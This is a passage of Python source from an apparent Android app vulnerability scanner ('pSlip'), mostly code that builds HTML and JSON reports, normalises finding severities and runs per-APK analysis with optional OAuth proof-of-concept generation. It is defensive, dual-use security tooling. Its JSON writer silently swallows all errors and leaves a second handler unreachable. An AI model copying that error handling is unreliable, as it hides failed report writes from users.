    SEV_CLS = ["critical", "high", "medium", "low", "info"]
    sev_to_idx = {s: i for i, s in enumerate(SEV_LABELS)}

    def _sev_index(s):
        return sev_to_idx.get((s or "Info").strip().title(), 4)

    # ------------------------------------------------------------
    # Intern data so the JSON island stays compact at scale:
    #   package names, issue types, and severity labels are deduped
    #   and findings reference them by index.
    # ------------------------------------------------------------
    pkgs, pkg_idx = [], {}
    issues, issue_idx = [], {}

    def _intern(lst, idx, val):
        v = val if val is not None else ""
        if v not in idx:
            idx[v] = len(lst)
            lst.append(v)
        return idx[v]

    findings = []          # [pkgIdx, sevIdx, issueIdx, component, conf, details, adb]
    per_pkg_counts = {}    # pkgIdx -> [c,h,m,l,i]

    for v in vulnerabilities:
        p = v.get('package_name') or 'N/A'
        pi = _intern(pkgs, pkg_idx, p)
        si = _sev_index(v.get('Severity', 'Info'))
        ii = _intern(issues, issue_idx, (v.get('Issue Type') or 'N/A'))
        findings.append([
            pi, si, ii,
            v.get('Component', '') or 'N/A',
            str(v.get('Confidence', '') if v.get('Confidence', '') is not None else ''),
            v.get('Details', '') or 'N/A',
            v.get('ADB Command', '') or 'N/A',
        ])
        c = per_pkg_counts.setdefault(pi, [0, 0, 0, 0, 0])
        c[si] += 1

    # Permissions island (rendered on demand, never in initial DOM)
    perms_island = []
    if permissions:
        for apk_file, perms_list in permissions.items():
            perms_island.append([os.path.basename(apk_file), list(perms_list or [])])

    total_findings = len(findings)
    total_apps = len(pkgs)

    # Per-app metadata for the (lightweight) accordion summaries
    def _headline_cls(counts):
        for i in range(5):
            if counts[i]:
                return SEV_CLS[i]
        return 'info'

    def _sev_attr(counts):
        present = [SEV_CLS[i] for i in range(5) if counts[i]]
        return ' '.join(present) if present else 'info'

    def _badges(counts):
        out = []
        for i in range(5):
            if counts[i]:
                out.append(f"<span class='cb cb-{SEV_CLS[i]}'>{SEV_LABELS[i][0]}&nbsp;{counts[i]}</span>")
        return ''.join(out) or "<span class='cb cb-info'>0</span>"

    # Order apps: highest severity present first, then name
    app_order = sorted(
        range(len(pkgs)),
        key=lambda pi: (
            next((i for i in range(5) if per_pkg_counts.get(pi, [0]*5)[i]), 5),
            pkgs[pi].lower(),
        )
    )

    # ------------------------------------------------------------
    # HEAD + CSS
    # ------------------------------------------------------------
    H = []
    H.append("""<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>pSlip Vulnerability Report</title>
<style>
:root {
  --bg:#f8fafc; --text:#0f172a; --muted:#64748b; --card:#ffffff;
  --border:#e2e8f0; --primary:#3b82f6; --radius:12px;
}
@media (prefers-color-scheme: dark){
  :root { --bg:#0b1220; --text:#e2e8f0; --muted:#94a3b8; --card:#111827;
          --border:#1e293b; --primary:#60a5fa; }
}
body { margin:0; background:var(--bg); color:var(--text);
  font-family: ui-sans-serif, system-ui, -apple-system, "Segoe UI", Roboto; }
header { background: linear-gradient(90deg,#1e293b,#334155); padding:14px 20px;
  color:#fff; font-weight:700; font-size:18px; position:sticky; top:0; z-index:30; }
.container { width:min(1200px,95vw); margin:18px auto 60px; }
.muted { color:var(--muted); }
.note { color:var(--muted); font-size:13px; margin:8px 0; }
noscript .nojs { background:#fff3cd; color:#7a5b00; border:1px solid #ffe08a;
  padding:12px 16px; border-radius:var(--radius); display:block; margin:12px 0; }

.toolbar { position:sticky; top:46px; z-index:25; display:flex; flex-wrap:wrap;
  align-items:center; gap:8px; padding:10px 0; margin-bottom:6px;
  background:var(--bg); border-bottom:1px solid var(--border); }
.toolbar .btn { cursor:pointer; border:1px solid var(--border); background:var(--card);
  color:var(--text); padding:6px 12px; border-radius:8px; font-size:13px; font-weight:600; }
.toolbar .btn:hover { background:var(--primary); color:#fff; border-color:var(--primary); }
.toolbar .sep { width:1px; height:22px; background:var(--border); margin:0 4px; }
.toolbar .lbl { font-size:12px; color:var(--muted); }
.chip { cursor:pointer; border:1px solid var(--border); background:var(--card);
  padding:5px 10px; border-radius:999px; font-size:12px; font-weight:600; }
.chip.active { background:var(--primary); color:#fff; border-color:var(--primary); }
.search { flex:1 1 160px; min-width:130px; padding:6px 10px; border:1px solid var(--border);
  border-radius:8px; background:var(--card); color:var(--text); font-size:13px; }
.hidden { display:none !important; }

details.acc { background:var(--card); border:1px solid var(--border);
  border-radius:var(--radius); margin:12px 0; overflow:hidden; }
details.acc > summary { list-style:none; cursor:pointer; padding:12px 16px;
  display:flex; align-items:center; gap:10px; user-select:none; }
details.acc > summary::-webkit-details-marker { display:none; }
details.acc > summary::before { content:"\\25B8"; color:var(--muted); font-size:12px;
  transition:transform .15s ease; flex:0 0 auto; }
details.acc[open] > summary::before { transform:rotate(90deg); }
details.acc > summary:hover { background: rgba(59,130,246,0.06); }
.summary-title { font-weight:700; font-size:15px; word-break:break-all; }
.summary-sub { font-size:12px; color:var(--muted); font-weight:600; }
.summary-spacer { flex:1 1 auto; }
.acc-body { padding:0 16px 16px; }
.pkg-block { border-left:4px solid var(--primary);
  content-visibility:auto; contain-intrinsic-size:auto 52px; }
.pkg-block.h-critical { border-left-color:#dc2626; }
.pkg-block.h-high { border-left-color:#e11d48; }
.pkg-block.h-medium { border-left-color:#ea580c; }
.pkg-block.h-low { border-left-color:#059669; }
.pkg-block.h-info { border-left-color:#0284c7; }

.cb { font-size:11px; font-weight:700; padding:2px 7px; border-radius:999px; white-space:nowrap; }
.cb-critical{background:#fee2e2;color:#991b1b;} .cb-high{background:#ffe4e6;color:#9f1239;}
.cb-medium{background:#fff7ed;color:#9a3412;} .cb-low{background:#ecfdf5;color:#065f46;}
.cb-info{background:#e0f2fe;color:#075985;}
@media (prefers-color-scheme: dark){
 .cb-critical{background:rgba(239,68,68,.2);color:#fecaca;} .cb-high{background:rgba(244,63,94,.2);color:#fecdd3;}
 .cb-medium{background:rgba(251,146,60,.2);color:#fed7aa;} .cb-low{background:rgba(16,185,129,.2);color:#bbf7d0;}
 .cb-info{background:rgba(59,130,246,.2);color:#bfdbfe;}
}

.pkg-header { margin:10px 0; padding:12px 14px; background:var(--card);
  border-left:4px solid var(--primary); border-radius:var(--radius); }
.pkg-title { font-size:16px; font-weight:700; margin-bottom:4px; }

table { width:100%; border-collapse:collapse; background:var(--card);
  border:1px solid var(--border); border-radius:var(--radius); overflow:hidden;
  font-size:14px; margin-top:10px; }
th { text-align:left; padding:10px 12px; background:var(--border); font-weight:600; }
td { padding:10px 12px; border-top:1px solid var(--border); vertical-align:top; }
tr:hover td { background: rgba(59,130,246,0.08); }
.findings-table tr { cursor:pointer; }
.adb-command { font-family: ui-monospace, SFMono-Regular, Menlo, monospace;
  font-size:12px; color:var(--muted); word-break:break-all; white-space:pre-wrap; }

.sev { padding:3px 8px; border-radius:999px; font-size:12px; font-weight:600; }
.sev-critical{background:#fee2e2;color:#991b1b;} .sev-high{background:#ffe4e6;color:#9f1239;}
.sev-medium{background:#fff7ed;color:#9a3412;} .sev-low{background:#ecfdf5;color:#065f46;}
.sev-info{background:#e0f2fe;color:#075985;}
@media (prefers-color-scheme: dark){
 .sev-critical{background:rgba(239,68,68,.2);color:#fecaca;} .sev-high{background:rgba(244,63,94,.2);color:#fecdd3;}
 .sev-medium{background:rgba(251,146,60,.2);color:#fed7aa;} .sev-low{background:rgba(16,185,129,.2);color:#bbf7d0;}
 .sev-info{background:rgba(59,130,246,.2);color:#bfdbfe;}
}
/* Narrow viewports: shrink padding/typography and let any table that still
   exceeds the width scroll horizontally instead of overflowing the page. */
.acc-body { overflow-x:auto; }
@media (max-width: 640px){
  .container { padding-left:12px; padding-right:12px; }
  table { font-size:13px; }
  th, td { padding:7px 8px; }
  .acc-body { padding:0 10px 12px; }
  .toolbar { gap:4px; }
  header { font-size:18px; }
}
</style>
</head>
<body>
<header>pSlip Vulnerability Report</header>
<div class="container" id="top">
""")

    from datetime import datetime as _dt
    H.append("<p class='note'>Generated on " + _dt.now().strftime('%Y-%m-%d %H:%M:%S')
             + f" &middot; {total_apps} app(s) &middot; {total_findings} finding(s)</p>")
    H.append("<noscript><span class='nojs'>This report renders findings on demand with "
             "JavaScript so it stays fast at thousands of apps. Your browser has JavaScript "
             "disabled, so only the per-app summaries below are visible. Enable JavaScript to "
             "view finding details and the searchable index.</span></noscript>")

    # ------------------------------------------------------------
    # TOOLBAR
    # ------------------------------------------------------------
    H.append("""
    <div class="toolbar">
      <button class="btn" onclick="expandShown()">Expand shown</button>
      <button class="btn" onclick="collapseAll()">Collapse all</button>
      <span class="sep"></span>
      <span class="lbl">Severity:</span>
      <span class="chip active" data-f="all" onclick="setFilter(this,'all')">All</span>
      <span class="chip" data-f="critical" onclick="setFilter(this,'critical')">Critical</span>
      <span class="chip" data-f="high" onclick="setFilter(this,'high')">High</span>
      <span class="chip" data-f="medium" onclick="setFilter(this,'medium')">Medium</span>
      <span class="chip" data-f="low" onclick="setFilter(this,'low')">Low</span>
      <span class="chip" data-f="info" onclick="setFilter(this,'info')">Info</span>
      <input class="search" type="text" placeholder="Filter apps / index by package..." oninput="setSearch(this.value)" />
    </div>
    """)

    # ------------------------------------------------------------
    # SUMMARY (static, tiny)
    # ------------------------------------------------------------
    cats = rollup_by_category(vulnerabilities)
    H.append("""
    <details class="acc" open id="Risk">
      <summary><span class="summary-title">Summary</span></summary>
      <div class="acc-body">
    """)
    for cat_name in ["OAuth", "Hardening", "Component Exposure", "Crypto",
                     "JavaScript Injection", "URL Redirect", "Permissions"]:
        cat_v = cats.get(cat_name, [])
        if cat_v:
            H.append(format_category_summary_table(cat_name, cat_v))
    H.append("</div></details>")

    # ------------------------------------------------------------
    # FINDINGS INDEX (JS-rendered, filtered, capped)
    # ------------------------------------------------------------
    H.append(f"""
    <details class="acc idx-block">
      <summary>
        <span class="summary-title">Findings Index</span>
        <span class="summary-spacer"></span>
        <span class="summary-sub">{total_findings} finding(s) - click a row to open that app</span>
      </summary>
      <div class="acc-body">
        <div class="note" id="idx-status"></div>
        <table class="findings-table">
          <thead>
            <tr><th>App (package)</th><th>Issue Type</th><th>Component</th><th>Severity</th><th>Conf.</th></tr>
          </thead>
          <tbody id="idx-body"></tbody>
        </table>
        <div style="margin-top:10px;">
          <button class="btn" id="idx-more" style="display:none;" onclick="indexShowAll()">Render all rows (may be slow)</button>
        </div>
      </div>
    </details>
    """)

    # ------------------------------------------------------------
    # APPS (bucketed + lazy: JS builds a 1000/500/100/50 tree on demand)
    # ------------------------------------------------------------
    if total_apps == 0:
        H.append("<p>No vulnerabilities found.</p>")
    else:
        H.append("<h2 style='margin:22px 0 6px'>Apps "
                 f"<span class='summary-sub'>({total_apps})</span></h2>")
        H.append("<div class='note' id='apps-hint'></div>")
        H.append("<div id='apps-pinned'></div>")    # jumped-to app (from index)
        H.append("<div id='apps-browse'></div>")    # bucket tree (no filter)
        H.append("<div id='apps-filtered' class='hidden'></div>")  # flat filtered list

    # ------------------------------------------------------------
    # PERMISSIONS (JS-rendered on open)
    # ------------------------------------------------------------
    if perms_island:
        H.append(f"""
        <details class="acc" id="perms-block">
          <summary><span class="summary-title">Permissions Summary</span>
          <span class="summary-spacer"></span>
          <span class="summary-sub">{len(perms_island)} app(s)</span></summary>
          <div class="acc-body" data-rendered="0" id="perms-body"></div>
        </details>
        """)

    # ------------------------------------------------------------
    # DATA ISLAND  (compact, interned; not rendered until needed)
    # ------------------------------------------------------------
    # counts indexed by package index; order = display order (severity, name)
    counts_by_pi = [per_pkg_counts.get(pi, [0, 0, 0, 0, 0]) for pi in range(len(pkgs))]
    data = {"pkgs": pkgs, "sevs": SEV_LABELS, "issues": issues,
            "f": findings, "perms": perms_island,
            "order": app_order, "counts": counts_by_pi}
    # Embed safely inside a <script>: neutralize sequences that could close the
    # tag or be parsed as HTML. JSON.parse restores the original characters.
    blob = _json.dumps(data, ensure_ascii=False, separators=(',', ':'))
    blob = (blob.replace('<', '\\u003c').replace('>', '\\u003e')
                .replace('&', '\\u0026').replace('\u2028', '\\u2028').replace('\u2029', '\\u2029'))
    H.append('<script id="pslip-data" type="application/json">' + blob + '</script>')

    # ------------------------------------------------------------
    # CLIENT LOGIC (no external deps; renders on demand)
    # ------------------------------------------------------------
    H.append("""
<script>
(function(){
  var D = JSON.parse(document.getElementById('pslip-data').textContent);
  var SEVCLS = ['critical','high','medium','low','info'];
  var INDEX_CAP = 1000;       // max index rows rendered before requiring "show all"
  var EXPAND_CAP = 300;       // max app bodies to open at once

  // group finding-row indices by package index (built once)
  var byPkg = {};
  for (var i=0; i<D.f.length; i++){ var pi=D.f[i][0]; (byPkg[pi]||(byPkg[pi]=[])).push(i); }

  var SIZES = [1000, 500, 100, 50];   // nested grouping units
  var APP_CAP = 500;                  // max app accordions in a filtered view
  var SEVCOLOR = {critical:'#dc2626',high:'#e11d48',medium:'#ea580c',low:'#059669',info:'#0284c7'};

  var state = { sev:'all', q:'' };
  var indexAll = false, appsAll = false;

  function el(tag, cls, txt){ var e=document.createElement(tag); if(cls)e.className=cls; if(txt!=null)e.textContent=txt; return e; }
  function headlineCls(c){ for(var i=0;i<5;i++){ if(c[i]) return SEVCLS[i]; } return 'info'; }
  function sevAttr(c){ var p=[]; for(var i=0;i<5;i++){ if(c[i]) p.push(SEVCLS[i]); } return p.join(' ')||'info'; }
  function appendBadges(summaryEl, c){
    var any=false;
    for(var i=0;i<5;i++){ if(c[i]){ var b=el('span','cb cb-'+SEVCLS[i]); b.textContent=D.sevs[i][0]+'\\u00a0'+c[i]; summaryEl.appendChild(b); any=true; } }
    if(!any){ var z=el('span','cb cb-info'); z.textContent='0'; summaryEl.appendChild(z); }
  }
  function firstApplicable(n){ for(var i=0;i<SIZES.length;i++){ if(SIZES[i]<n) return SIZES[i]; } return 0; }
  function aggCounts(a,b){ var t=[0,0,0,0,0]; for(var k=a;k<b;k++){ var c=D.counts[D.order[k]]; for(var i=0;i<5;i++) t[i]+=c[i]; } return t; }

  // ---- app accordion (summary only; findings render on open) ----
  function makeApp(pi, prefix){
    var c=D.counts[pi], name=D.pkgs[pi];
    var d=el('details','acc pkg-block h-'+headlineCls(c)); d.id=prefix+pi;
    d.dataset.idx=pi; d.dataset.pkg=name.toLowerCase(); d.dataset.sev=sevAttr(c);
    var s=el('summary'); s.appendChild(el('span','summary-title',name));
    s.appendChild(el('span','summary-spacer')); appendBadges(s,c); d.appendChild(s);
    var body=el('div','acc-body'); body.dataset.rendered='0'; d.appendChild(body);
    return d;
  }
  function renderApp(det){
    var body=det.querySelector('.acc-body');
    if(!body || body.dataset.rendered==='1') return;
    var pi=+det.dataset.idx, rows=(byPkg[pi]||[]).slice();
    var tbl=el('table','details-table'), thead=el('thead'), htr=el('tr');
    ['Component','Issue Type','Severity','Confidence','Details'].forEach(function(h){ htr.appendChild(el('th',null,h)); });
    thead.appendChild(htr); tbl.appendChild(thead);
    var tb=el('tbody');
    rows.sort(function(a,b){ return D.f[a][1]-D.f[b][1]; });
    rows.forEach(function(ri){
      var f=D.f[ri], tr=el('tr');
      tr.appendChild(el('td',null,f[3]));
      tr.appendChild(el('td',null,D.issues[f[2]]));
      var sd=el('td'); sd.appendChild(el('span','sev sev-'+SEVCLS[f[1]],D.sevs[f[1]])); tr.appendChild(sd);
      tr.appendChild(el('td',null,f[4]));
      var dtd=el('td',null,f[5]);
      if(f[6] && f[6]!=='N/A'){
        dtd.appendChild(document.createElement('br'));
        dtd.appendChild(el('strong',null,'ADB Command:'));
        dtd.appendChild(document.createElement('br'));
        dtd.appendChild(el('div','adb-command', String(f[6]).replace(/\\\\n/g,'\\n')));
      }
      tr.appendChild(dtd); tb.appendChild(tr);
    });
    tbl.appendChild(tb); body.appendChild(tbl);
    var back=el('div','note'); var a=el('a',null,'Back to top'); a.href='#top'; back.appendChild(a); body.appendChild(back);
    body.dataset.rendered='1';
  }
  function clearApp(det){ var b=det.querySelector('.acc-body'); if(b){ b.textContent=''; b.dataset.rendered='0'; } }

  // ---- bucket (range header; children render on open) ----
  function makeBucket(a,b){
    var c=aggCounts(a,b), hl=headlineCls(c);
    var d=el('details','acc bkt'); d.id='bkt-'+a+'-'+b; d.dataset.a=a; d.dataset.b=b;
    d.style.borderLeft='4px solid '+SEVCOLOR[hl];
    d.style.contentVisibility='auto'; d.style.containIntrinsicSize='auto 52px';
    var s=el('summary'); s.appendChild(el('span','summary-title','Apps '+(a+1)+'-'+b));
    s.appendChild(el('span','summary-spacer'));
    s.appendChild(el('span','summary-sub',(b-a)+' apps')); appendBadges(s,c); d.appendChild(s);
    var body=el('div','acc-body'); body.dataset.rendered='0'; d.appendChild(body);
    return d;
  }
  function renderRange(container,a,b){
    var size=firstApplicable(b-a), frag=document.createDocumentFragment();
    if(!size){ for(var k=a;k<b;k++) frag.appendChild(makeApp(D.order[k],'app-b-')); }
    else { for(var ca=a;ca<b;ca+=size){ frag.appendChild(makeBucket(ca, Math.min(b,ca+size))); } }
    container.appendChild(frag);
  }
  function renderBucket(det){
    var body=det.querySelector('.acc-body');
    if(!body || body.dataset.rendered==='1') return;
    renderRange(body, +det.dataset.a, +det.dataset.b);
    body.dataset.rendered='1';
  }
  function buildBrowse(){
    var c=document.getElementById('apps-browse'); if(!c) return;
    c.textContent=''; renderRange(c, 0, D.order.length);
  }

  // One capture-phase listener handles every accordion (toggle does not bubble
  // but can be captured), so it works for elements created at any time.
  document.addEventListener('toggle', function(e){
    var d=e.target; if(!d.classList) return;
    if(d.classList.contains('pkg-block')){ if(d.open) renderApp(d); else clearApp(d); }
    else if(d.classList.contains('bkt')){ if(d.open) renderBucket(d); }
    else if(d.classList.contains('perm-app')){ if(d.open) renderPermApp(d); }
  }, true);

  // ---- findings index (filtered + capped) ----
  function rowMatches(f){
    if(state.sev!=='all' && SEVCLS[f[1]]!==state.sev) return false;
    if(state.q && D.pkgs[f[0]].toLowerCase().indexOf(state.q)<0) return false;
    return true;
  }
  function renderIndex(){
    var tb=document.getElementById('idx-body'); if(!tb) return;
    tb.textContent='';
    var ord=[];
    for(var i=0;i<D.f.length;i++){ if(rowMatches(D.f[i])) ord.push(i); }
    ord.sort(function(a,b){ var d=D.f[a][1]-D.f[b][1]; if(d) return d;
      return D.pkgs[D.f[a][0]].toLowerCase()<D.pkgs[D.f[b][0]].toLowerCase()?-1:1; });
    var total=ord.length, cap= indexAll?total:Math.min(total,INDEX_CAP), frag=document.createDocumentFragment();
    for(var k=0;k<cap;k++){
      var f=D.f[ord[k]], tr=el('tr');
      tr.appendChild(el('td',null,D.pkgs[f[0]]));
      tr.appendChild(el('td',null,D.issues[f[2]]));
      tr.appendChild(el('td',null,f[3]));
      var sd=el('td'); sd.appendChild(el('span','sev sev-'+SEVCLS[f[1]],D.sevs[f[1]])); tr.appendChild(sd);
      tr.appendChild(el('td',null,f[4]));
      (function(pi){ tr.onclick=function(){ goto(pi); }; })(f[0]);
      frag.appendChild(tr);
    }
    tb.appendChild(frag);
    var st=document.getElementById('idx-status'), more=document.getElementById('idx-more');
    if(cap<total){ st.textContent='Showing '+cap+' of '+total+' matching findings. Narrow the filter, or render all.'; more.style.display=''; }
    else { st.textContent='Showing all '+total+' matching findings.'; more.style.display='none'; }
  }
  window.indexShowAll=function(){ indexAll=true; renderIndex(); };

  // ---- apps view: buckets when unfiltered, flat capped list when filtered ----
  function matchingApps(){
    var res=[], si=SEVCLS.indexOf(state.sev);
    for(var i=0;i<D.order.length;i++){ var pi=D.order[i], c=D.counts[pi];
      if(state.sev!=='all' && !c[si]) continue;
      if(state.q && D.pkgs[pi].toLowerCase().indexOf(state.q)<0) continue;
      res.push(pi);
    }
    return res;
  }
  function renderFiltered(){
    var c=document.getElementById('apps-filtered'); if(!c) return;
    c.textContent='';
    var m=matchingApps(), cap= appsAll?m.length:Math.min(m.length,APP_CAP);
    var head=el('div','note');
    head.textContent= cap<m.length ? ('Showing '+cap+' of '+m.length+' matching apps. ')
                                    : ('Showing '+m.length+' matching app(s).');
    if(cap<m.length){ var bb=el('button','btn'); bb.textContent='Show all apps'; bb.onclick=function(){ appsAll=true; renderFiltered(); }; head.appendChild(bb); }
    c.appendChild(head);
    var frag=document.createDocumentFragment();
    for(var k=0;k<cap;k++) frag.appendChild(makeApp(m[k],'app-f-'));
    c.appendChild(frag);
  }
  function applyAppsView(){
    var browse=(state.sev==='all' && !state.q);
    var b=document.getElementById('apps-browse'), f=document.getElementById('apps-filtered'),
        hint=document.getElementById('apps-hint');
    if(!b) return;
    b.classList.toggle('hidden',!browse);
    f.classList.toggle('hidden',browse);
    if(browse){ if(hint) hint.textContent='Grouped into nested buckets (1000 / 500 / 100 / 50). Open a group to drill in.'; }
    else { appsAll=false; renderFiltered(); if(hint) hint.textContent=''; }
  }

  window.setFilter=function(elm,sev){
    var chips=document.querySelectorAll('.toolbar .chip');
    for(var i=0;i<chips.length;i++) chips[i].classList.remove('active');
    elm.classList.add('active');
    state.sev=sev; indexAll=false; renderIndex(); applyAppsView();
  };
  window.setSearch=function(q){ state.q=(q||'').toLowerCase().trim(); indexAll=false; renderIndex(); applyAppsView(); };

  window.expandShown=function(){
    var vis=[].slice.call(document.querySelectorAll('.pkg-block:not(.hidden)'));
    if(vis.length>APP_CAP){ alert('Too many apps shown to expand at once ('+vis.length+'). Narrow with a filter or open a smaller group first.'); return; }
    vis.forEach(function(d){ d.open=true; });
  };
  window.collapseAll=function(){
    var all=document.querySelectorAll('details');
    for(var i=0;i<all.length;i++) all[i].open=false;
  };

  // ---- permissions (capped list; each app's list renders on open) ----
  var PERM_CAP = 500; var permsAll = false;
  function renderPermApp(det){
    var body=det.querySelector('.acc-body'); if(!body || body.dataset.rendered==='1') return;
    var pi=+det.dataset.pi, ul=el('ul');
    (D.perms[pi][1]||[]).forEach(function(p){ ul.appendChild(el('li',null,p)); });
    body.appendChild(ul); body.dataset.rendered='1';
  }
  function makePermApp(pi){
    var entry=D.perms[pi];
    var sub=el('details','acc perm-app'); sub.dataset.pi=pi;
    var sm=el('summary'); sm.appendChild(el('span','summary-title',entry[0]));
    sm.appendChild(el('span','summary-spacer'));
    sm.appendChild(el('span','summary-sub',entry[1].length+' permission(s)'));
    sub.appendChild(sm);
    var bd=el('div','acc-body'); bd.dataset.rendered='0'; sub.appendChild(bd);
    return sub;
  }
  function renderPermsList(){
    var body=document.getElementById('perms-body'); if(!body) return;
    body.textContent='';
    var total=D.perms.length, cap= permsAll?total:Math.min(total,PERM_CAP);
    var head=el('div','note');
    head.textContent= cap<total ? ('Showing '+cap+' of '+total+' apps with permissions. ')
                                 : ('Showing all '+total+' app(s) with permissions.');
    if(cap<total){ var bb=el('button','btn'); bb.textContent='Show all'; bb.onclick=function(){ permsAll=true; renderPermsList(); }; head.appendChild(bb); }
    body.appendChild(head);
    var frag=document.createDocumentFragment();
    for(var k=0;k<cap;k++) frag.appendChild(makePermApp(k));
    body.appendChild(frag);
    body.dataset.rendered='1';
  }
  var pb=document.getElementById('perms-block');
  if(pb){
    pb.addEventListener('toggle', function(){
      var body=document.getElementById('perms-body');
      if(pb.open && body.dataset.rendered!=='1') renderPermsList();
    });
  }

  // ---- navigation: pin the jumped-to app at the top so it is always reachable
  //      regardless of bucket/filter state (avoids deep-tree path reveal). ----
  function pinApp(pi){
    var c=document.getElementById('apps-pinned'); if(!c) return;
    c.textContent='';
    var lbl=el('div','note'); lbl.textContent='Jumped to '+D.pkgs[pi]+':'; c.appendChild(lbl);
    var d=makeApp(pi,'app-pin-'); c.appendChild(d); d.open=true; renderApp(d);
    if(d.scrollIntoView) d.scrollIntoView();
  }
  function goto(pi){ try{ location.hash='#app-'+pi; }catch(e){} pinApp(pi); }
  window.goto=goto;
  window.addEventListener('hashchange', function(){ var mm=(location.hash||'').match(/^#app-(\\d+)$/); if(mm) pinApp(+mm[1]); });

  // initial paint
  renderIndex();
  buildBrowse();
  applyAppsView();
  var mm0=(location.hash||'').match(/^#app-(\\d+)$/); if(mm0) pinApp(+mm0[1]);
})();
</script>
""")

    H.append("</div></body></html>")
    html_content = ''.join(H)

    try:
        with open(output_file, 'w', encoding='utf-8') as f:
            f.write(html_content)
        print(f"{GREEN}HTML report successfully generated at '{output_file}'.{RESET}")
    except Exception as e:
        print(f"{RED}Error: Failed to write HTML report to '{output_file}': {e}{RESET}")



        
def _apply_category_severity(v):
    """
    Safely override default severity levels based on category rules.
    Only applies if the issue type belongs to one of the known pSlip categories.
    This function NEVER removes or renames fields.
    """

    it = (v.get("Issue Type", "") or "").lower()

    # ---- Never DEMOTE an explicit Critical. Category rules below set a
    #      consistent baseline per issue type, but if an analyzer (or the OAuth
    #      CONFIRMED tier) has already judged a finding Critical, that is the
    #      most severe tier and must survive normalization so it populates. ----
    if (v.get("Severity", "") or "").strip().title() == "Critical":
        return

    # ---- OAuth scheme hijack: severity already set by the OAuth adapter
    #      (driven by the confidence tier / finding tier). Leave it as-is. ----
    if it.startswith("oauth"):
        return

    # ---- Hardening ----
    if "hardening:" in it:
        if "allowbackup" in it:
            v["Severity"] = "Low"
        elif "cleartext" in it:
            v["Severity"] = "Low"
        elif "debuggable" in it:
            v["Severity"] = "High"
        elif "contentprovider" in it:
            v["Severity"] = "High"
        return

    # ---- Exported Components ----
    if it.startswith("exported component"):
        v["Severity"] = "Medium"
        return

    # ---- CALL Exposure ----
    if it.startswith("exposed call"):
        v["Severity"] = "High"
        return

    # ---- JavaScript Injection ----
    if "javascript injection" in it:
        v["Severity"] = "Medium"
        return

    # ---- URL Redirect ----
    if it == "url redirect":
        v["Severity"] = "Low"
        return

    # ---- Segment ----
    if "hardcoded segment write key" in it:
        v["Severity"] = "High"
        return

    # ---- Crypto ----
    if "hardcoded aes key" in it:
        v["Severity"] = "High"
        return
    if "hardcoded des key" in it:
        v["Severity"] = "High"
        return
    if "hardcoded iv" in it:
        v["Severity"] = "Medium"
        return

    # ---- Weak Permission ----
    if it == "weak permission":
        v["Severity"] = "Info"
        return

    # default: leave severity unchanged
    return

def _severity_rank(sev: str) -> int:
    if not sev:
        return 99
    s = (str(sev) or "").strip().lower()
    order = {"critical": 0, "high": 1, "medium": 2, "low": 3, "info": 4, "informational": 4}
    return order.get(s, 98)

def _sorted_vulns(vulns):
    def key(v):
        sev = v.get("Severity", "")
        conf = v.get("Confidence", 0)
        try:
            conf_num = int(float(conf))
        except (TypeError, ValueError):
            conf_num = 0
        comp = v.get("Component", "") or ""
        return (_severity_rank(sev), -conf_num, comp.lower())
    return sorted(vulns, key=key)



def generate_json_report(vulnerabilities, permissions, output_file):
        # Normalize severity across all categories before JSON output
    normalize_all_vulnerability_severities(vulnerabilities)

    """
    writes a JSON report:
      {
        "generated_at": "YYYY-MM-DD HH:MM:SS",
        "summary": {
          "apps_scanned": <int>,
          "findings": <int>
        },
        "vulnerabilities": [...],
        "permissions": {...}
      }
    """
    from datetime import datetime as _dt
    try:
        permissions = permissions or {}
        # Sort for determinism
        vulns_sorted = _sorted_vulns(vulnerabilities or [])
        report = {
            "generated_at": _dt.now().strftime("%Y-%m-%d %H:%M:%S"),
            "summary": {
                "apps_scanned": len(set(v.get("package_name","") for v in (vulns_sorted or []) if v.get("package_name"))),
                "findings": len(vulns_sorted or [])
            },
            "vulnerabilities": vulns_sorted,
            "permissions": permissions or {}
        }
        with open(output_file, "w", encoding="utf-8") as f:
            json.dump(report, f, ensure_ascii=False, indent=2)
        print(f"{GREEN}JSON report written to {output_file}{RESET}")
    except Exception:
        pass
    except Exception as e:
        print(f"{RED}Error writing JSON: {e}{RESET}")

def _severity_weight(sev: str) -> int:
    s = (str(sev) or "").strip().lower()
    return {"critical":5, "high":4, "medium":3, "low":2, "info":1, "informational":1}.get(s, 1)


def _anchorize(s: str) -> str:
    s = ''.join(ch if (ch.isalnum() or ch in '._-') else '-' for ch in (s or ''))
    while '--' in s:
        s = s.replace('--', '-')
    return s.strip('-') or 'item'


def analyze_apk(args):
    (apk_file, list_permissions_flag, check_js, check_call,
     collect_permission_vulns, gen_oauth_poc, oauth_poc_dir) = args
    _args_original = (apk_file, list_permissions_flag, check_js, check_call, collect_permission_vulns)

    # Per-APK isolation: imap_unordered re-raises a worker exception in the
    # parent, which would abort the entire batch (and lose the report). A
    # single malformed/adversarial APK must only cost its own result.
    try:
        apk_file, vulnerabilities, permissions, package_name = analyze_apk_original(_args_original)
    except Exception:
        return apk_file, [], [], os.path.basename(apk_file)

    # OAuth scheme-hijack scan is baked in (always-on). PoC project generation
    # is gated on the -oauth-poc flag. run_oauth_scan never raises, so a single
    # malformed APK cannot take down this worker during a large batch.
    try:
        oauth_vulns = run_oauth_scan(
            apk_file, package_name=package_name,
            gen_poc=gen_oauth_poc, poc_root=oauth_poc_dir)
        if oauth_vulns:
            vulnerabilities.extend(oauth_vulns)
    except Exception:
        pass

    return apk_file, vulnerabilities, permissions, package_name


# ---------------- AES scan timeout helpers ----------------
def _pslip__aes_worker(apk_file, pkg_name, q):
    """run AES key analysis in an isolated process and return results via queue."""
    res = []
    try:
        res = decompile_and_find_aes_keys(apk_file, pkg_name)
    except Exception:
        res = []
    try:
        q.put(res)
    except Exception:
        pass

def run_aes_with_timeout(apk_file, pkg_name, timeout_seconds):
    """
    run AES analysis in a separate process with a hard timeout.
    If it exceeds the timeout, terminate and return [] (assumed failure/skip).
    If timeout_seconds <= 0, run inline with no timeout.
    """
    import multiprocessing
    if timeout_seconds is None or timeout_seconds <= 0:
        try:
            return decompile_and_find_aes_keys(apk_file, pkg_name)
        except Exception:
            return []

    q = multiprocessing.Queue()
    p = multiprocessing.Process(target=_pslip__aes_worker, args=(apk_file, pkg_name, q), daemon=True)
    p.start()

    # Drain the queue with a bounded get BEFORE join. Reading first avoids the
    # get_nowait()-after-join race that can silently drop valid AES findings,
    # and avoids a large-payload feeder-pipe deadlock.
    import time as _time
    import queue as _queue
    result = []
